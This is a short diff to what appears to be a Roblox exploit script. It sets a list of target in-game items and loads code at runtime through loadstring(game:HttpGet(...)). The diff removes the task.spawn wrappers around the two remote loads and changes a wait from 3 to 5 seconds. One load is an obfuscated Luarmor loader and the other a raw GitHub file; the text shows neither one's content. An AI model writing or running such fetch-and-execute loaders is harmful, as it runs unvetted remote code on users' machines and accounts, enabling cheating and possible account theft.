@@ -80,12 +80,8 @@ getgenv().TARGET_BRAINROTS = {
     ["Burguro And Fryuro"] = true,
     ["Los Hotspotsitos"] = true
 }
-task.spawn(function()
-  loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
-end)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 
-task.wait(3) -- wait 3 seconds (increase if needed)
+task.wait(5)
 
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/appu-crl/faah/refs/heads/main/um"))()
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/appu-crl/faah/refs/heads/main/um"))()
